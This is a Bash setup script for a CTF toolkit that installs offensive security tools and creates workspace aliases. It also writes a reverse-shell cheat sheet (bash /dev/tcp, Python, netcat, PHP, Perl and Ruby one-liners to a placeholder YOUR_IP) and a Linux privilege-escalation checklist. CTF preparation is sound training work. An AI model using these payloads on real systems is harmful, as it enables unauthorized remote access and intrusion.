#!/bin/bash

#=============================================================================
# Cornedry CTF - Auto Setup Script
# Installe tous les outils nécessaires pour dominer le CTF
#=============================================================================

BOLD="\033[1m"
RED="\033[0;31m"
GREEN="\033[0;32m"
BLUE="\033[0;34m"
YELLOW="\033[1;33m"
RESET="\033[0m"

echo -e "${BOLD}${BLUE}"
cat << 'EOF'
╔═══════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                               								║
║     █████████                                         ██████████                       		║
║    ███░░░░░███                                       ░░███░░░░███                      		║
║   ███     ░░░   ██████  ████████  ████████    ██████  ░███   ░░███ ████████  █████ ████		║
║  ░███          ███░░███░░███░░███░░███░░███  ███░░███ ░███    ░███░░███░░███░░███ ░███ 		║
║  ░███         ░███ ░███ ░███ ░░░  ░███ ░███ ░███████  ░███    ░███ ░███ ░░░  ░███ ░███ 		║
║  ░░███     ███░███ ░███ ░███      ░███ ░███ ░███░░░   ░███    ███  ░███      ░███ ░███ 		║
║   ░░█████████ ░░██████  █████     ████ █████░░██████  ██████████   █████     ░░███████ 		║
║    ░░░░░░░░░   ░░░░░░  ░░░░░     ░░░░ ░░░░░  ░░░░░░  ░░░░░░░░░░   ░░░░░       ░░░░░███ 		║
║                                                                             ███ ░███ 			║
║                                                                            ░░██████  			║
║                                                                             ░░░░░░      		║     														  			   																				 
║                                                               								║
║                    AUTO SETUP SCRIPT                          								║
║                  Preparing for CTF domination                 								║
║                                                                								║
╚═══════════════════════════════════════════════════════════════════════════════════════════════╝
EOF
echo -e "${RESET}"

# Check if running as root for some operations
if [ "$EUID" -ne 0 ]; then 
    echo -e "${YELLOW}[!] Some installations require sudo privileges${RESET}"
    echo -e "${YELLOW}[!] You may be prompted for your password${RESET}\n"
fi

# Create tools directory
TOOLS_DIR="$HOME/tools"
mkdir -p "$TOOLS_DIR"

# Progress function
progress() {
    echo -e "${GREEN}[✓]${RESET} $1"
}

warning() {
    echo -e "${YELLOW}[!]${RESET} $1"
}

error() {
    echo -e "${RED}[✗]${RESET} $1"
}

info() {
    echo -e "${BLUE}[→]${RESET} $1"
}

# Update system
echo -e "\n${BOLD}${BLUE}[1/10] Updating System${RESET}"
info "This may take a few minutes..."
sudo apt update -qq
progress "System updated"

# Install essential packages
echo -e "\n${BOLD}${BLUE}[2/10] Installing Essential Packages${RESET}"
ESSENTIALS="curl wget git python3 python3-pip build-essential net-tools"
info "Installing: $ESSENTIALS"
sudo apt install -y $ESSENTIALS > /dev/null 2>&1
progress "Essential packages installed"

# Install recon tools
echo -e "\n${BOLD}${BLUE}[3/10] Installing Reconnaissance Tools${RESET}"
RECON_TOOLS="nmap masscan dnsutils whois netcat-traditional"
info "Installing: nmap, masscan, DNS utils, netcat"
sudo apt install -y $RECON_TOOLS > /dev/null 2>&1
progress "Recon tools installed"

# Install web tools
echo -e "\n${BOLD}${BLUE}[4/10] Installing Web Exploitation Tools${RESET}"
WEB_TOOLS="gobuster dirb nikto whatweb wfuzz feroxbuster"
info "Installing: gobuster, dirb, nikto, whatweb"
sudo apt install -y $WEB_TOOLS > /dev/null 2>&1
progress "Web tools installed"

# Install exploitation tools
echo -e "\n${BOLD}${BLUE}[5/10] Installing Exploitation Tools${RESET}"
EXPLOIT_TOOLS="sqlmap metasploit-framework exploitdb"
info "Installing: sqlmap, metasploit, exploitdb"
sudo apt install -y $EXPLOIT_TOOLS > /dev/null 2>&1
progress "Exploitation tools installed"

# Install password cracking tools
echo -e "\n${BOLD}${BLUE}[6/10] Installing Password Tools${RESET}"
PASSWORD_TOOLS="john hashcat hydra crunch"
info "Installing: john, hashcat, hydra"
sudo apt install -y $PASSWORD_TOOLS > /dev/null 2>&1
progress "Password tools installed"

# Install wordlists
echo -e "\n${BOLD}${BLUE}[7/10] Installing Wordlists${RESET}"
sudo apt install -y wordlists seclists > /dev/null 2>&1

# Extract rockyou if compressed
if [ -f "/usr/share/wordlists/rockyou.txt.gz" ]; then
    info "Extracting rockyou.txt..."
    sudo gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null
fi

# Clone SecLists if not present
if [ ! -d "$TOOLS_DIR/SecLists" ]; then
    info "Cloning SecLists..."
    git clone --quiet --depth 1 https://github.com/danielmiessler/SecLists.git "$TOOLS_DIR/SecLists" 2>/dev/null
fi

progress "Wordlists installed"

# Install Python tools
echo -e "\n${BOLD}${BLUE}[8/10] Installing Python Tools${RESET}"
info "Installing: impacket, pwncat-cs, requests"
pip3 install --quiet --upgrade pip 2>/dev/null
pip3 install --quiet impacket pwncat-cs requests 2>/dev/null
progress "Python tools installed"

# Clone useful GitHub tools
echo -e "\n${BOLD}${BLUE}[9/10] Cloning GitHub Tools${RESET}"

# LinPEAS
if [ ! -d "$TOOLS_DIR/PEASS-ng" ]; then
    info "Cloning PEASS-ng (LinPEAS/WinPEAS)..."
    git clone --quiet --depth 1 https://github.com/carlospolop/PEASS-ng.git "$TOOLS_DIR/PEASS-ng" 2>/dev/null
    chmod +x "$TOOLS_DIR/PEASS-ng/linPEAS/linpeas.sh" 2>/dev/null
fi

# Linux Smart Enumeration
if [ ! -d "$TOOLS_DIR/linux-smart-enumeration" ]; then
    info "Cloning Linux Smart Enumeration..."
    git clone --quiet --depth 1 https://github.com/diego-treitos/linux-smart-enumeration.git "$TOOLS_DIR/linux-smart-enumeration" 2>/dev/null
    chmod +x "$TOOLS_DIR/linux-smart-enumeration/lse.sh" 2>/dev/null
fi

# Subfinder
if [ ! -d "$TOOLS_DIR/Subfinder" ]; then
    info "Cloning Subfinder..."
    git clone --quiet --depth 1 https://github.com/aboul3la/Subfinder.git "$TOOLS_DIR/Subfinder" 2>/dev/null
    pip3 install --quiet -r "$TOOLS_DIR/Subfinder/requirements.txt" 2>/dev/null
fi

# XSStrike
if [ ! -d "$TOOLS_DIR/XSStrike" ]; then
    info "Cloning XSStrike..."
    git clone --quiet --depth 1 https://github.com/s0md3v/XSStrike.git "$TOOLS_DIR/XSStrike" 2>/dev/null
    pip3 install --quiet -r "$TOOLS_DIR/XSStrike/requirements.txt" 2>/dev/null
fi

# Responder
if [ ! -d "$TOOLS_DIR/Responder" ]; then
    info "Cloning Responder..."
    git clone --quiet --depth 1 https://github.com/lgandx/Responder.git "$TOOLS_DIR/Responder" 2>/dev/null
fi

# PayloadsAllTheThings
if [ ! -d "$TOOLS_DIR/PayloadsAllTheThings" ]; then
    info "Cloning PayloadsAllTheThings..."
    git clone --quiet --depth 1 https://github.com/swisskyrepo/PayloadsAllTheThings.git "$TOOLS_DIR/PayloadsAllTheThings" 2>/dev/null
fi

progress "GitHub tools cloned"

# Setup workspace
echo -e "\n${BOLD}${BLUE}[10/10] Setting Up CTF Workspace${RESET}"
CTF_WORKSPACE="$HOME/ctf_workspace"
mkdir -p "$CTF_WORKSPACE"/{logs,loot,scans,exploits,notes}
progress "Workspace created at: $CTF_WORKSPACE"

# Create quick access aliases
ALIASES_FILE="$HOME/.bash_aliases"
if [ ! -f "$ALIASES_FILE" ] || ! grep -q "Cornedry CTF ALIASES" "$ALIASES_FILE"; then
    cat >> "$ALIASES_FILE" << 'ALIASES'

# Cornedry CTF ALIASES
alias ctf='cd ~/ctf_workspace'
alias Cornedry='~/Cornedry_ctf_enhanced.sh'
alias linpeas='~/tools/PEASS-ng/linPEAS/linpeas.sh'
alias lse='~/tools/linux-smart-enumeration/lse.sh'
alias http-server='python3 -m http.server'
alias payloads='cd ~/tools/PayloadsAllTheThings'
alias seclists='cd ~/tools/SecLists'
alias revshell='nc -lvnp'
ALIASES
    progress "Aliases added to ~/.bash_aliases"
    info "Run 'source ~/.bashrc' to activate aliases"
fi

# Download common reverse shells
echo -e "\n${BOLD}${BLUE}Creating Quick Reference Files${RESET}"
cat > "$CTF_WORKSPACE/reverse_shells.txt" << 'SHELLS'
# REVERSE SHELL CHEAT SHEET
# Replace YOUR_IP and PORT accordingly

## BASH
bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1

## PYTHON
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

## NETCAT
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP PORT >/tmp/f

## PHP
php -r '$sock=fsockopen("YOUR_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

## PERL
perl -e 'use Socket;$i="YOUR_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

## RUBY
ruby -rsocket -e'f=TCPSocket.open("YOUR_IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

## LISTENER (on your machine)
nc -lvnp PORT
SHELLS

cat > "$CTF_WORKSPACE/privesc_checklist.txt" << 'PRIVESC'
# LINUX PRIVILEGE ESCALATION CHECKLIST

## Quick Wins
[ ] sudo -l
[ ] find / -perm -4000 2>/dev/null
[ ] getcap -r / 2>/dev/null
[ ] cat /etc/crontab
[ ] cat /etc/passwd | grep -v nologin
[ ] ls -la /home
[ ] history

## System Information
[ ] uname -a
[ ] cat /etc/issue
[ ] cat /etc/os-release
[ ] env

## Network
[ ] netstat -tulpn
[ ] ss -tulpn
[ ] iptables -L

## Processes
[ ] ps aux
[ ] ps aux | grep root

## Writable Directories
[ ] find / -writable -type d 2>/dev/null
[ ] ls -la /tmp /var/tmp /dev/shm

## Docker/Container
[ ] docker ps
[ ] cat /.dockerenv
[ ] groups

## Files
[ ] find / -name "*.txt" -o -name "*.conf" 2>/dev/null
[ ] find / -name "password*" -o -name "*password" 2>/dev/null
PRIVESC

progress "Reference files created"

# Final summary
echo -e "\n${BOLD}${GREEN}"
cat << 'EOF'
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║                    INSTALLATION COMPLETE!                     ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
EOF
echo -e "${RESET}"

echo -e "${GREEN}✓${RESET} All tools installed successfully!\n"

echo -e "${BOLD}Quick Start:${RESET}"
echo -e "  1. Run: ${BLUE}source ~/.bashrc${RESET}"
echo -e "  2. Launch: ${BLUE}./Cornedry_ctf_enhanced.sh${RESET}"
echo -e "  3. Or use alias: ${BLUE}Cornedry${RESET}\n"

echo -e "${BOLD}Installed Tools:${RESET}"
echo -e "  ${GREEN}✓${RESET} Nmap, Masscan, Gobuster, Dirb"
echo -e "  ${GREEN}✓${RESET} SQLMap, Nikto, WhatWeb"
echo -e "  ${GREEN}✓${RESET} John, Hashcat, Hydra"
echo -e "  ${GREEN}✓${RESET} Metasploit, Impacket"
echo -e "  ${GREEN}✓${RESET} LinPEAS, LSE, PayloadsAllTheThings"
echo -e "  ${GREEN}✓${RESET} SecLists, RockyYou wordlists\n"

echo -e "${BOLD}Workspace:${RESET}"
echo -e "  ${BLUE}$CTF_WORKSPACE${RESET}\n"

echo -e "${BOLD}Quick Aliases:${RESET}"
echo -e "  ${BLUE}ctf${RESET}         - Go to CTF workspace"
echo -e "  ${BLUE}Cornedry${RESET} - Launch main tool"
echo -e "  ${BLUE}linpeas${RESET}     - Run LinPEAS"
echo -e "  ${BLUE}lse${RESET}         - Run Linux Smart Enumeration"
echo -e "  ${BLUE}http-server${RESET} - Start HTTP server"
echo -e "  ${BLUE}revshell${RESET}    - Start netcat listener\n"

echo -e "${BOLD}${YELLOW}Pro Tips:${RESET}"
echo -e "  • Read the guide: ${BLUE}cat CTF_SURVIVAL_GUIDE.md${RESET}"
echo -e "  • Check reverse shells: ${BLUE}cat ~/ctf_workspace/reverse_shells.txt${RESET}"
echo -e "  • PrivEsc checklist: ${BLUE}cat ~/ctf_workspace/privesc_checklist.txt${RESET}\n"

echo -e "${BOLD}${GREEN}You're all set! Good luck in your CTF! 🚀${RESET}\n"

# Optional: Test basic tools
echo -e "${BOLD}Testing Core Tools:${RESET}"
command -v nmap >/dev/null 2>&1 && echo -e "  ${GREEN}✓${RESET} nmap" || echo -e "  ${RED}✗${RESET} nmap"
command -v gobuster >/dev/null 2>&1 && echo -e "  ${GREEN}✓${RESET} gobuster" || echo -e "  ${RED}✗${RESET} gobuster"
command -v sqlmap >/dev/null 2>&1 && echo -e "  ${GREEN}✓${RESET} sqlmap" || echo -e "  ${RED}✗${RESET} sqlmap"
command -v john >/dev/null 2>&1 && echo -e "  ${GREEN}✓${RESET} john" || echo -e "  ${RED}✗${RESET} john"
command -v hashcat >/dev/null 2>&1 && echo -e "  ${GREEN}✓${RESET} hashcat" || echo -e "  ${RED}✗${RESET} hashcat"
command -v hydra >/dev/null 2>&1 && echo -e "  ${GREEN}✓${RESET} hydra" || echo -e "  ${RED}✗${RESET} hydra"
[ -f "$TOOLS_DIR/PEASS-ng/linPEAS/linpeas.sh" ] && echo -e "  ${GREEN}✓${RESET} linpeas" || echo -e "  ${RED}✗${RESET} linpeas"

echo -e "\n${BOLD}${BLUE}Happy Hacking! 🎯${RESET}\n"
